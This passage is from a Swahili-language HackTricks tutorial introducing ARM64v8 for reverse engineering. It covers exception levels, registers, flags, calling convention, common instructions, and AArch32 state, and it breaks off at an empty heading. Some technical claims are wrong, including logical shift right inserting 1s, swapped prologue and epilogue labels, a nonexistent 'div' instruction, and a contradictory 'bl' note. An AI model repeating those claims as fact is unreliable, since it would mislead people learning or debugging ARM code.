# Utangulizi kwa ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Ngazi za Isipokuwa - EL (ARM64v8)**

Katika usanifu wa ARMv8, viwango vya utekelezaji, vinavyojulikana kama Exception Levels (ELs), vinafafanua kiwango cha ruhusa na uwezo wa mazingira ya utekelezaji. Kuna viwango vinne vya exception, vinavyoanzia EL0 hadi EL3, kila kimoja kikiwa na kusudi tofauti:

1. **EL0 - User Mode**:
- Hii ni ngazi yenye ruhusa kidogo na hutumika kwa kutekeleza msimbo wa programu za kawaida.
- Programu zinazofanya kazi katika EL0 zimepangwa kutengwa kutoka kwa kila mmoja na kutoka kwa programu za mfumo, kuweka usalama na utulivu.
2. **EL1 - Operating System Kernel Mode**:
- Mengine ya kernels ya mfumo wa uendeshaji yanatumia ngazi hii.
- EL1 ina ruhusa zaidi kuliko EL0 na inaweza kufikia rasilimali za mfumo, lakini kwa vizuizi fulani kuhakikisha uadilifu wa mfumo.
3. **EL2 - Hypervisor Mode**:
- Ngazi hii hutumika kwa virtualizaton. Hypervisor inayoendesha katika EL2 inaweza kusimamia mifumo mingi ya uendeshaji (kila moja katika EL1 yake) ikifanya kazi kwenye vifaa hivyo vya kimwili.
- EL2 hutoa vipengele vya kutengwa na udhibiti wa mazingira yaliyo virtualized.
4. **EL3 - Secure Monitor Mode**:
- Hii ni ngazi yenye ruhusa zaidi na mara nyingi hutumika kwa secure booting na trusted execution environments.
- EL3 inaweza kusimamia na kudhibiti ufikiaji kati ya hali salama na zisizo salama (kama secure boot, trusted OS, n.k).

Matumizi ya ngazi hizi yanaruhusu njia iliyopangwa na salama ya kusimamia nyanja tofauti za mfumo, kutoka kwa programu za watumiaji hadi programu za mfumo zenye ruhusa nyingi. Njia ya ARMv8 kuhusu viwango vya ruhusa husaidia kutenganisha vipengele tofauti vya mfumo kwa ufanisi, hivyo kuongeza usalama na uimara wa mfumo.

## **Virejista (ARM64v8)**

ARM64 ina **virejista 31 za madhumuni ya jumla**, zinazoandikwa `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **64-bit** (8-byte). Kwa operesheni zinazohitaji thamani za 32-bit pekee, virejista hivyo vinaweza kufikiwa katika modi ya 32-bit kwa kutumia majina `w0` hadi `w30`.

1. **`x0`** hadi **`x7`** - Hizi kawaida hutumika kama virejista vya muda na kwa kupitisha vigezo kwa subroutines.
- **`x0`** pia hubeba data za kurudi za function
2. **`x8`** - Katika kernel ya Linux, `x8` hutumika kama nambari ya system call kwa maelekezo ya `svc`. **Katika macOS x16 ndilo linalotumika!**
3. **`x9`** hadi **`x15`** - Virejista vingine vya muda, mara nyingi hutumika kwa vigezo vya ndani.
4. **`x16`** na **`x17`** - **Intra-procedural Call Registers**. Virejista vya muda kwa thamani za papo hapo. Pia hutumika kwa mifumo ya kuita function isiyo ya moja kwa moja na PLT stubs.
- **`x16`** hutumika kama **nambari ya system call** kwa maelekezo ya **`svc`** katika **macOS**.
5. **`x18`** - **Platform register**. Inaweza kutumika kama rejista ya madhumuni ya jumla, lakini kwenye baadhi ya majukwaa, rejista hii imehifadhiwa kwa matumizi maalum ya jukwaa: Pointer kwa current thread environment block katika Windows, au kuashiria structure ya kazi inayotekelezwa sasa katika linux kernel.
6. **`x19`** hadi **`x28`** - Hizi ni virejista vinavyohifadhiwa na callee. Function lazima ihifadhi thamani za virejista hivi kwa caller wake, kwa hivyo zinahifadhiwa kwenye stack na kurejeshwa kabla ya kurudi kwa caller.
7. **`x29`** - **Frame pointer** ya kufuatilia fremu ya stack. Wakati fremu mpya ya stack inaundwa kwa sababu function imeitwa, rejista ya **`x29`** **inahifadhiwa kwenye stack** na anwani ya frame mpya (aniwani ya **`sp`**) **inahifadhiwa katika rejista hii**.
- Rejista hii pia inaweza kutumika kama **rejista ya madhumuni ya jumla** ingawa kawaida hutumika kama rejea kwa **vigezo vya ndani**.
8. **`x30`** au **`lr`**- **Link register**. Inashikilia **anwani ya kurudi** wakati maelekezo `BL` (Branch with Link) au `BLR` (Branch with Link to Register) yanatekelezwa kwa kuhifadhi thamani ya **`pc`** katika rejista hii.
- Pia inaweza kutumika kama rejista nyingine yoyote.
- Ikiwa function ya sasa itaaita function mpya na kwa hivyo kuandika juu `lr`, itaihifadhi kwenye stack mwanzoni, hii ni epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Hifadhi `fp` na `lr`, tengeneza nafasi na pata `fp` mpya) na kuirejesha mwishoni, hii ni prologue (`ldp x29, x30, [sp], #48; ret` -> Rejesha `fp` na `lr` na rudi).
9. **`sp`** - **Stack pointer**, hutumika kufuatilia kilele cha stack.
- thamani ya **`sp`** inapaswa kuwekwa daima kwa angalau **quadword** **alignment** au kosa la alignment linaweza kutokea.
10. **`pc`** - **Program counter**, inayoashiria maelekezo yajayo. Rejista hii inaweza tu kusasishwa kupitia uzalishaji wa exception, kurudi kwa exception, na branches. Maelekezo ya kawaida pekee yanayoweza kusoma rejista hii ni yale ya branch with link (BL, BLR) kuhifadhi anwani ya **`pc`** katika **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Inajulikana pia kama **`wzr`** katika umbo lake la **32**-bit. Inaweza kutumika kupata thamani ya sifuri kwa urahisi (operesheni ya kawaida) au kufanya kulinganisha kwa kutumia **`subs`** kama **`subs XZR, Xn, #10`** bila kuhifadhi matokeo mahali (katika **`xzr`**).

Virejista vya **`Wn`** ni toleo la **32bit** la rejista za **`Xn`**.

> [!TIP]
> Virejista kutoka X0 - X18 ni volatile, ambayo ina maana thamani zao zinaweza kubadilika kwa wito za function na interrupts. Hata hivyo, virejista kutoka X19 - X28 ni non-volatile, zinamaanisha thamani zao lazima zihifadhiwe kupitia wito za function ("callee saved").

### Virejista za SIMD na Floating-Point

Zaidi ya hayo, kuna **virejista 32 za urefu wa 128bit** ambazo zinaweza kutumika katika operesheni za optimized single instruction multiple data (SIMD) na kwa kuendesha hesabu za floating-point. Hizi zinaitwa Vn ingawa zinaweza pia kufanya kazi katika **64**-bit, **32**-bit, **16**-bit na **8**-bit na wakati huo zinaitwa **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** na **`Bn`**.

### Virejista vya Mfumo

**Kuna mamia ya system registers**, pia zinazoitwa special-purpose registers (SPRs), zinatumiwa kwa **kusimamia** na **kudhibiti** tabia za **processors**.\
Zinaweza kusomwa au kuandikwa tu kwa kutumia maelekezo maalum ya `mrs` na `msr`.

Virejista maalum **`TPIDR_EL0`** na **`TPIDDR_EL0`** mara nyingi hupatikana wakati wa reversing engineering. Kiambishi `EL0` kinaonyesha **ngazi ndogo kabisa ya exception** ambayo rejista inaweza kufikiwa kutoka (katika kesi hii EL0 ni kiwango cha kawaida (privilege) ambacho programu za kawaida zinafanya kazi kwa).\
Mara nyingi hutumika kuhifadhi **anwani ya msingi ya eneo la thread-local storage** la kumbukumbu. Kwa kawaida ya kwanza inasomeka na kuandikwa kwa programu zinazoendesha katika EL0, lakini ya pili inaweza kusomwa kutoka EL0 na kuandikwa kutoka EL1 (kama kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** ina vipengele kadhaa vya mchakato vilivyopangwa ndani ya rejista maalum inayoonekana kwa mfumo wa uendeshaji `SPSR_ELx`, ambapo X ni **ngazi ya ruhusa ya exception** iliyosababisha (hii inaruhusu kurejesha hali ya mchakato wakati exception inapoisha).\
Hivi ndivyo vitu vinavyopatikana:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Bendera za hali (**`N`**, **`Z`**, **`C`** na **`V`**):
- **`N`** ina maana operesheni ilileta matokeo hasi
- **`Z`** ina maana operesheni ilileta sifuri
- **`C`** ina maana operesheni ilibeba (carry)
- **`V`** ina maana operesheni ilisababisha overflow iliyo na saini:
  - Jumla ya nambari mbili chanya inaleta matokeo hasi.
  - Jumla ya nambari mbili hasi inaleta matokeo chanya.
  - Katika utofauti, wakati nambari hasi kubwa inaanzishwa kutoka kwa nambari chanya ndogo (au kinyume), na matokeo hayawezi kuwakilishwa ndani ya ukubwa wa biti uliotolewa.
  - Kwa wazi processor haitambui kama operesheni ni yenye saini au la, kwa hivyo itacheki C na V katika operesheni na kuonyesha kama carry ilitokea ikiwa ilikuwa iliyo na saini au isiyo na saini.

> [!WARNING]
> Si maelekezo yote yanasasisha bendera hizi. Baadhi kama **`CMP`** au **`TST`** hufanya, na mengine yenye nyongeza `s` kama **`ADDS`** pia hufanya.

- Bendera ya sasa ya **upana wa rejista (`nRW`)**: Ikiwa bendera ina thamani 0, programu itaendesha katika state ya AArch64 mara itakayorejeshwa.
- **Ngazi ya Exception** ya sasa (**`EL`**): Programu ya kawaida inayofanya kazi katika EL0 itakuwa na thamani 0
- Bendera ya **single stepping** (**`SS`**): Inatumika na debuggers kufanya hatua kwa hatua kwa kuweka bendera SS kuwa 1 ndani ya `SPSR_ELx` kupitia exception. Programu itaendesha hatua moja na kutoa exception ya single step.
- Bendera ya hali ya **illegal exception** (**`IL`**): Inatumika kumarka wakati programu ya mwenye ruhusa inafanya uhamisho wa ngazi ya exception usio halali, bendera hii inawekwa kuwa 1 na processor itasababisha exception ya hali isiyo halali.
- Bendera za **`DAIF`**: Bendera hizi zinamruhusu programu yenye ruhusa kuzima kwa namna chaguo fulani exceptions za nje.
- Ikiwa **`A`** ni 1 ina maana **asynchronous aborts** zitasababisha. **`I`** inasanidiwa kujibu External hardware **Interrupt Requests** (IRQs). na F inahusiana na **Fast Interrupt Requests** (FIRs).
- Bendera za kuchagua stack pointer (**`SPS`**): Programu zenye ruhusa zinazoendesha katika EL1 na juu zinaweza kubadilisha kati ya kutumia rejista yao ya stack pointer na ile ya mtindo wa mtumiaji (mfano kati ya `SP_EL1` na `EL0`). Mabadiliko haya hufanywa kwa kuandika kwenye rejista maalum `SPSel`. Hii haiwezi kufanyika kutoka EL0.

## **Calling Convention (ARM64v8)**

Mkataba wa kupiga simu wa ARM64 unaelekeza kuwa **vigezo vinane vya kwanza** kwa function hupitishwa katika virejista **`x0` kupitia `x7`**. Vigezo **vilivyozidi** hupitishwa kwenye **stack**. Thamani ya **kurudi** inarudishwa katika rejista **`x0`**, au katika **`x1`** pia **ikiwa ni 128 bits ndefu**. Virejista **`x19`** hadi **`x30`** na **`sp`** vinapaswa **kuhifadhiwa** kupitia wito za function.

Wakati unasoma function katika assembly, tafuta **prologue** na **epilogue** ya function. **Prologue** kawaida inajumuisha **kuhifadhi frame pointer (`x29`)**, **kuweka** frame pointer mpya, na **kutenga nafasi ya stack**. **Epilogue** kawaida inajumuisha **kurejesha frame pointer iliyohifadhiwa** na **kurudi** kutoka kwenye function.

### Calling Convention in Swift

Swift ina **calling convention** yake ambayo inaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Maagizo ya Kawaida (ARM64v8)**

Maelekezo ya ARM64 kwa ujumla yana muundo wa **`opcode dst, src1, src2`**, ambapo **`opcode`** ni **operesheni** itakayotekelezwa (kama `add`, `sub`, `mov`, n.k.), **`dst`** ni rejista ya **lengo** ambapo matokeo yatahifadhiwa, na **`src1`** na **`src2`** ni **vyanzo**. Thamani za papo hapo zinaweza pia kutumika badala ya virejista vya chanzo.

- **`mov`**: **Hamisha** thamani kutoka rejista moja hadi nyingine.
- Mfano: `mov x0, x1` — Hii inahamisha thamani kutoka `x1` hadi `x0`.
- **`ldr`**: **Pakia** thamani kutoka **kumbukumbu** hadi **rejista**.
- Mfano: `ldr x0, [x1]` — Hii inapakia thamani kutoka eneo la kumbukumbu linaloashiriwa na `x1` ndani ya `x0`.
- **Modo ya offset**: Offset inayoathiri pointer ya asili inaonyeshwa, kwa mfano:
- `ldr x2, [x1, #8]`, hii itapakia ndani ya x2 thamani kutoka x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, hii itapakia ndani ya x2 kitu kutoka safu x0, kutoka nafasi x1 (index) * 4
- **Modo ya pre-indexed**: Hii itafanya hesabu kwa asili, kupata matokeo na pia kuhifadhi asili mpya katika asili.
- `ldr x2, [x1, #8]!`, hii itapakia `x1 + 8` katika `x2` na kuhifadhi katika x1 matokeo ya `x1 + 8`
- `str lr, [sp, #-4]!`, Hifadhi link register katika sp na sasisha rejista sp
- **Modo ya post-index**: Hii ni kama ile ya hapo juu lakini anwani ya kumbukumbu inafikiwa kisha offset inahesabiwa na kuhifadhiwa.
- `ldr x0, [x1], #8`, pakia `x1` katika `x0` na sasisha x1 na `x1 + 8`
- **PC-relative addressing**: Katika kesi hii anwani ya kupakia huhesabiwa kwa uhusiano na rejista pc
- `ldr x1, =_start`, Hii itapakia anwani ambapo alama `_start` inaanza katika x1 kuhusiana na PC ya sasa.
- **`str`**: **Hifadhi** thamani kutoka **rejista** hadi **kumbukumbu**.
- Mfano: `str x0, [x1]` — Hii inahifadhi thamani ya `x0` katika eneo la kumbukumbu linaloashiriwa na `x1`.
- **`ldp`**: **Load Pair of Registers**. Maelekezo haya **hupanua vifungo viwili** kutoka **eneo la kumbukumbu linaloendelea**. Anwani ya kumbukumbu kwa kawaida inaundwa kwa kuongeza offset kwa thamani katika rejista nyingine.
- Mfano: `ldp x0, x1, [x2]` — Hii inapakia `x0` na `x1` kutoka maeneo ya kumbukumbu katika `x2` na `x2 + 8`, mtawalia.
- **`stp`**: **Store Pair of Registers**. Amri hii **inahifadhi rejista mbili** kwa **maeneo ya kumbukumbu yanayofuata**. Anwani ya kumbukumbu kwa kawaida inaundwa kwa kuongeza offset kwa thamani katika rejista nyingine.
- Mfano: `stp x0, x1, [sp]` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu katika `sp` na `sp + 8`, mtawalia.
- `stp x0, x1, [sp, #16]!` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu katika `sp+16` na `sp + 24`, mtawalia, na inasasisha `sp` kuwa `sp+16`.
- **`add`**: **Ongeza** thamani za virejista viwili na hifadhi matokeo katika rejista.
- Sintaksia: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (rejista au immediate)
- \[shift #N | RRX] -> Fanya shift au tumia RRX
- Mfano: `add x0, x1, x2` — Hii inaongeza thamani za `x1` na `x2` pamoja na kuhifadhi matokeo katika `x0`.
- `add x5, x5, #1, lsl #12` — Hii ni sawa na 4096 (1 ikishiftwa mara 12) -> 1 0000 0000 0000 0000
- **`adds`** Hii hufanya `add` na kusasisha bendera
- **`sub`**: **Toa** thamani za virejista viwili na hifadhi matokeo katika rejista.
- Angalia **sintaksia ya `add`**.
- Mfano: `sub x0, x1, x2` — Hii inaondoa thamani ya `x2` kutoka `x1` na kuhifadhi matokeo katika `x0`.
- **`subs`** Hii ni kama sub lakini ikisasisha flag
- **`mul`**: **Zidisha** thamani za **virejista viwili** na hifadhi matokeo katika rejista.
- Mfano: `mul x0, x1, x2` — Hii inazidisha thamani za `x1` na `x2` na kuhifadhi matokeo katika `x0`.
- **`div`**: **Gawanya** thamani ya rejista moja kwa nyingine na hifadhi matokeo katika rejista.
- Mfano: `div x0, x1, x2` — Hii inagawa thamani ya `x1` kwa `x2` na kuhifadhi matokeo katika `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Ongeza 0s mwishoni ukisogeza biti nyingine mbele (kuzaa kwa n mara 2)
- **Logical shift right**: Ongeza 1s mwanzoni ukisogeza biti nyingine nyuma (gawanya kwa n mara 2 kwa unsigned)
- **Arithmetic shift right**: Kama **`lsr`**, lakini badala ya kuongeza 0s ikiwa bit ya juu zaidi ni 1, **1s zinaongezwa** (gawanya kwa n mara 2 kwa signed)
- **Rotate right**: Kama **`lsr`** lakini kile kinachokotolewa kutoka kulia kinarudishwa kushoto
- **Rotate Right with Extend**: Kama **`ror`**, lakini na bendera ya carry kama "most significant bit". Hivyo bendera ya carry inahamishwa hadi biti 31 na biti iliyotolewa kwenda bendera ya carry.
- **`bfm`**: **Bit Filed Move**, operesheni hizi **huhamisha bits `0...n`** kutoka thamani na kuziweka katika nafasi **`m..m+n`**. **`#s`** inaonyesha nafasi ya biti ya kushoto na **`#r`** ni kiasi cha rotate right.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Nakili bitfield kutoka rejista na kunakili kwa rejista nyingine.
- **`BFI X1, X2, #3, #4`** Ingiza bits 4 kutoka X2 kutoka biti ya 3 ya X1
- **`BFXIL X1, X2, #3, #4`** Toa kutoka biti ya 3 ya X2 bits nne na nakili kwenye X1
- **`SBFIZ X1, X2, #3, #4`** Inapanua kwa saini bits 4 kutoka X2 na kuingiza ndani ya X1 kuanzia bit nafasi 3 ikifuta bits za kulia
- **`SBFX X1, X2, #3, #4`** Inatoa bits 4 kuanzia biti 3 kutoka X2, inapanua kwa saini, na kuweka matokeo katika X1
- **`UBFIZ X1, X2, #3, #4`** Inapanua kwa sifuri bits 4 kutoka X2 na kuingiza ndani ya X1 kuanzia bit nafasi 3 ikifuta bits za kulia
- **`UBFX X1, X2, #3, #4`** Inatoa bits 4 kuanzia biti 3 kutoka X2 na kuweka matokeo yaliyo panuliwa kwa sifuri katika X1.
- **Sign Extend To X:** Inapanua saini (au kuongeza 0s katika toleo lisilo na saini) ya thamani ili kuwezesha operesheni nayo:
- **`SXTB X1, W2`** Inapanua saini ya byte **kutoka W2 hadi X1** (`W2` ni nusu ya `X2`) ili kuziba 64bits
- **`SXTH X1, W2`** Inapanua saini ya nambari ya 16bit **kutoka W2 hadi X1** ili kuziba 64bits
- **`SXTW X1, W2`** Inapanua saini ya byte **kutoka W2 hadi X1** ili kuziba 64bits
- **`UXTB X1, W2`** Inaongeza 0s (unsigned) kwa byte **kutoka W2 hadi X1** ili kuziba 64bits
- **`extr`:** Hutoa bits kutoka **jozi ya virejista zilizoshikiliwa mfululizo**.
- Mfano: `EXTR W3, W2, W1, #3` Hii itafanya **concat W1+W2** na kupata **kutoka biti 3 ya W2 hadi biti 3 ya W1** na kuihifadhi katika W3.
- **`cmp`**: **Linganisho** la virejista viwili na kuweka bendera za hali. Ni **alias ya `subs`** kuiweka rejista ya lengo kuwa zero register. Inafaa kujua ikiwa `m == n`.
- Inaunga mkono **sintaksia ile ile kama `subs`**
- Mfano: `cmp x0, x1` — Hii inalinganisha thamani za `x0` na `x1` na kuweka bendera za hali kwa mujibu.
- **`cmn`**: **Linganisho la negative** operand. Katika kesi hii ni **alias ya `adds`** na inaunga mkono sintaksia ile ile. Inafaa kujua ikiwa `m == -n`.
- **`ccmp`**: Linganisho la masharti, ni linganisho litakalofanywa tu kama linganisho la awali lilikuwa la kweli na hasa litasanidi bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ikiwa x1 != x2 na x3 < x4, ruka hadi func
- Hii ni kwa sababu **`ccmp`** itatekelezwa tu ikiwa **`cmp`** ya awali ilikuwa `NE`, kama sivyo bits `nzcv` zitasetwa kuwa 0 (ambayo haitaridhisha kulinganisha `blt`).
- Hii pia inaweza kutumika kama `ccmn` (sawa lakini negative, kama `cmp` dhidi ya `cmn`).
- **`tst`**: Inakagua ikiwa sehemu yoyote ya thamani za kulinganisha zote mbili ni 1 (inafanya kazi kama ANDS bila kuhifadhi matokeo mahali popote). Inafaa kukagua rejista dhidi ya thamani na kuona ikiwa moja ya bits za rejista zilizotajwa katika thamani ni 1.
- Mfano: `tst X1, #7` Angalia ikiwa yoyote ya bits 3 za mwisho za X1 ni 1
- **`teq`**: Operesheni ya XOR ikifuta matokeo
- **`b`**: Branch isiyokuwa na masharti
- Mfano: `b myFunction`
- Kumbuka hili halitajaza link register na anwani ya kurudi (sio nzuri kwa wito za subrutine zinazohitaji kurudi)
- **`bl`**: **Branch** with link, inayotumika **kuita** **subroutine**. Inahifadhi **anwani ya kurudi katika `x30`**.
- Mfano: `bl myFunction` — Hii inaita function `myFunction` na kuhifadhi anwani ya kurudi katika `x30`.
- Kumbuka hili halitajaza link register na anwani ya kurudi (sio nzuri kwa wito za subrutine zinazohitaji kurudi)
- **`blr`**: **Branch** with Link to Register, inayotumika **kuita** **subroutine** ambapo lengo linatafsiriwa katika **rejista**. Inahifadhi anwani ya kurudi katika `x30`.
- Mfano: `blr x1` — Hii inaita function ambayo anwani yake iko ndani ya `x1` na kuhifadhi anwani ya kurudi katika `x30`.
- **`ret`**: **Rudia** kutoka **subroutine**, kawaida kwa kutumia anwani katika **`x30`**.
- Mfano: `ret` — Hii inarudisha kutoka subroutine ya sasa kwa kutumia anwani ya kurudi katika `x30`.
- **`b.<cond>`**: Branch za masharti
- **`b.eq`**: **Branch ikiwa sawa**, kwa msingi wa amri ya `cmp` ya awali.
- Mfano: `b.eq label` — Ikiwa amri ya `cmp` ya awali iligundua thamani mbili sawa, hii inaruka hadi `label`.
- **`b.ne`**: **Branch ikiwa si sawa**. Amri hii inakagua bendera za hali (zilizosetwa na amri ya kulinganisha ya awali), na ikiwa thamani zililinganishwa hazikuwa sawa, inaruka hadi label au anwani.
- Mfano: Baada ya amri `cmp x0, x1`, `b.ne label` — Ikiwa thamani katika `x0` na `x1` hazikuwa sawa, hii inaruka hadi `label`.
- **`cbz`**: **Compare and Branch on Zero**. Amri hii inalinganisha rejista na sifuri, na ikiwa ni sawa, inaruka hadi label au anwani.
- Mfano: `cbz x0, label` — Ikiwa thamani katika `x0` ni sifuri, hii inaruka hadi `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Amri hii inalinganisha rejista na sifuri, na ikiwa si sawa, inaruka hadi label au anwani.
- Mfano: `cbnz x0, label` — Ikiwa thamani katika `x0` si sifuri, hii inaruka hadi `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Mfano: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Mfano: `tbz x0, #8, label`
- **Conditional select operations**: Hizi ni operesheni ambazo tabia zao zinatofautiana kulingana na bits za conditional.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ikiwa kweli, X0 = X1, ikiwa si kweli, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si kweli, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ikiwa kweli, Xd = Xn + 1, ikiwa si kweli, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si kweli, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ikiwa kweli, Xd = NOT(Xn), ikiwa si kweli, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si kweli, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ikiwa kweli, Xd = - Xn, ikiwa si kweli, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = 1, ikiwa si kweli, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = \<all 1>, ikiwa si kweli, Xd = 0
- **`adrp`**: Hesabu anwani ya ukurasa ya alama na kuihifadhi katika rejista.
- Mfano: `adrp x0, symbol` — Hii inahesabu anwani ya ukurasa wa `symbol` na kuihifadhi katika `x0`.
- **`ldrsw`**: **Pakia** thamani ya musema wa **32-bit** kutoka kumbukumbu na **upanua kwa saini hadi 64** bits.
- Mfano: `ldrsw x0, [x1]` — Hii inapakia thamani ya musema ya 32-bit kutoka eneo la kumbukumbu linaloashiriwa na `x1`, inapanua kwa saini hadi 64 bits, na kuihifadhi katika `x0`.
- **`stur`**: **Hifadhi thamani ya rejista kwa eneo la kumbukumbu**, ukitumia offset kutoka rejista nyingine.
- Mfano: `stur x0, [x1, #4]` — Hii inahifadhi thamani ya `x0` katika anwani ya kumbukumbu ambayo ni byte 4 mbele ya anwani iliyopo sasa katika `x1`.
- **`svc`** : Fanya **system call**. Inasimama kwa "Supervisor Call". Wakati processor inatekeleza amri hii, inabadilisha kutoka user mode hadi kernel mode na kuruka hadi eneo maalum la kumbukumbu ambapo msimbo wa kernel wa kushughulikia system call uko.

- Mfano:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Hifadhi link register na frame pointer kwenye stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Sanidi kiashiria kipya cha fremu**: `mov x29, sp` (huweka kiashiria kipya cha fremu kwa kazi ya sasa)
3. **Tenga nafasi kwenye stack kwa vigezo vya ndani** (ikiwa inahitajika): `sub sp, sp, <size>` (ambapo `<size>` ni idadi ya bytes zinazohitajika)

### **Hitimisho la Kazi**

1. **Rejesha nafasi ya vigezo vya ndani (ikiwa zilikuwa zimepangwa)**: `add sp, sp, <size>`
2. **Rejesha rejista ya link na kiashiria cha fremu**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Rudisha**: `ret` (inarudisha udhibiti kwa caller kwa kutumia anwani katika link register)

## AARCH32 Execution State

Armv8-A inaunga mkono utekelezaji wa programu za 32-bit. **AArch32** inaweza kuendesha katika mojawapo ya **seti mbili za maagizo**: **`A32`** na **`T32`** na inaweza kubadilisha kati yao kupitia **`interworking`**.\
**Privileged** 64-bit programs can schedule the **execution of 32-bit** programs by executing a exception level transfer to the lower privileged 32-bit.\
Kumbuka kuwa mabadiliko kutoka 64-bit hadi 32-bit hufanyika kwa exception level ya chini (kwa mfano programu ya 64-bit katika EL1 ikichochea programu katika EL0). Hii hufanywa kwa kuweka **bit 4 of** **`SPSR_ELx`** register maalum **kwa 1** wakati thread ya mchakato wa `AArch32` iko tayari kutekelezwa na sehemu nyingine ya `SPSR_ELx` inahifadhi CPSR ya programu za **`AArch32`**. Kisha, mchakato mwenye ruhusa anaita instruction ya **`ERET`** ili processor ibadilike kuwa **`AArch32`** ikingia katika A32 au T32 kulingana na CPSR**.**

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. Hii kwa kawaida inamaanisha kuweka bit ya chini kuwa 1 kuashiria kuwa seti ya maagizo ni T32.\
Hii imewekwa wakati wa **interworking branch instructions,** lakini pia inaweza kuwekwa moja kwa moja kwa maagizo mengine wakati PC imewekwa kama rejista ya destination. Mfano:

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Rejista

Kuna rejista 16 za 32-bit (r0-r15). **Kutoka r0 hadi r14** zinaweza kutumika kwa **operesheni yoyote**, ingawa baadhi yao kawaida huhifadhiwa:

- **`r15`**: Program counter (daima). Inashikilia anuani ya maelekezo yanayofuata. In A32 current + 8, in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Kumbuka stack daima imepangiliwa kwa 16-byte)
- **`r14`**: Link Register

Zaidi ya hayo, rejista zinaungwa mkono katika **`banked registries`**. Hizo ni sehemu zinazohifadhi thamani za rejista kuruhusu **fast context switching** katika kushughulikia exceptions na operesheni zilizo na ruhusa za juu ili kuepuka haja ya kuhifadhi na kurejesha rejista kila wakati kwa mkono.\
Hii hufanyika kwa **kuhifadhi hali ya processor kutoka `CPSR` hadi `SPSR`** ya mode ya processor ambapo exception inachukuliwa. Ukitokeza exception, **`CPSR`** inarejeshwa kutoka **`SPSR`**.

### CPSR - Current Program Status Register

In AArch32 CPSR inafanya kazi kama **`PSTATE`** katika AArch64 na pia inahifadhiwa katika **`SPSR_ELx`** wakati exception inachukuliwa ili kurejeshwa baadaye ya utekelezaji:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Sehemu zimegawanywa katika makundi kadhaa:

- Application Program Status Register (APSR): vifungo vya kihesabu na vinavyopatikana kutoka EL0
- Execution State Registers: Tabia ya mchakato (inasimamiwa na OS).

#### Application Program Status Register (APSR)

- Vifungo vya **`N`**, **`Z`**, **`C`**, **`V`** (kama ilivyo katika AArch64)
- Kifungo cha **`Q`**: Kinawekwa kuwa 1 kila wakati **saturation ya integer** inapotokea wakati wa kutekeleza maelekezo maalumu ya arithmetic inayosaturate. Mara kinawekwa kuwa **`1`**, kitaendelea kuwa na thamani hiyo hadi kiwe kimewekwa kwa 0 kwa mkono. Zaidi ya hayo, hakuna maelekezo yanayochunguza thamani yake kwa njia isiyo ya moja kwa moja; lazima isomwe kwa mkono.
- Vifungo vya **`GE`** (Greater than or equal): Vinatumika katika operesheni za SIMD (Single Instruction, Multiple Data), kama "parallel add" na "parallel subtract". Operesheni hizi zinaruhusu kusindika pointi nyingi za data kwa maelekezo moja.

Kwa mfano, maelekezo **`UADD8`** **huongeza jozi nne za bytes** (kutoka kwa operands mbili za 32-bit) kwa mpangilio na kuhifadhi matokeo katika rejista ya 32-bit. Kisha **huweka vifungo vya `GE` katika `APSR`** kulingana na matokeo haya. Kila kifungo cha GE kinahusiana na moja ya ziada za byte, kikionyesha kama kuongeza kwa jozi hiyo ya byte **iliuza**.

Maelekezo ya **`SEL`** hutumia vifungo hivyo vya GE kufanya vitendo kwa masharti.

#### Execution State Registers

